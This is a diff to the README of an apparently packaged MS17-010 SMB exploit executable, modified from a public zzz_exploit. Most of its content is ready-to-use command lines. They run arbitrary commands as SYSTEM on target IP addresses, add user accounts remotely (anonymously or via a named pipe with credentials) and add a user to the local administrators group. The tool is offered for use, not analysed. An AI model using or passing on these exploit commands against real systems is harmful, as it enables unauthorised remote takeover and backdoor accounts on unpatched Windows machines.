@@ -1,6 +1,7 @@
 # ms17-010
 This is a modified version of the [Worawit Wang: GitHub](https://github.com/worawit/MS17-010/) zzz_exploit for MS17-010.<br>
 It implements a few options such as username/password specification and an arbitrary command to be executed.<br>
+It does not change anything related to the SMB exploitation<br>
 This is a bundle with an executable and dependencies and DOES NOT require python install.
 
 # Usage
@@ -24,13 +25,16 @@ optional arguments:<br>
   -p PASSWORD, --password PASSWORD<br>
                         Password for the user<br>
 <br>
-Example: ms17-010.exe -t 172.16.0.2 -c 'net user /add srvnewcon4 teste123'<br>
+Example: ms17-010.exe -t 172.16.0.2 -c 'net user /add testusr teste123'<br>
 <br>
 
-Example to add a user remotely specifinc a named pipe and a valid non-administrator user:
-ms17-010-zzz.exe -t 10.128.1.208 -c "net user /add teste2 teste2123" -P netlogon -u svruser -p abc123
-
-Example to locally escalate privilege for an existent user (all commands are executed by SYSTEM):
+Example to add a user remotely connecting anonymously to a named pipe:<br>
+ms17-010-zzz.exe -t 10.128.1.208 -c "net user /add teste2 teste2123"<br>
+<br>
+Example to add a user remotely specifying a named pipe and a valid non-administrator user:<br>
+ms17-010-zzz.exe -t 10.128.1.208 -c "net user /add teste2 teste2123" -P netlogon -u svruser -p abc123<br>
+<br>
+Example to locally escalate privilege for an existent user (all commands are executed by SYSTEM):<br>
 ms17-010-zzz.exe -t 127.0.0.1 -c "net localgroup administrators teste2 /add" -P netlogon -u teste2 -p teste2123
 
 # Limitations
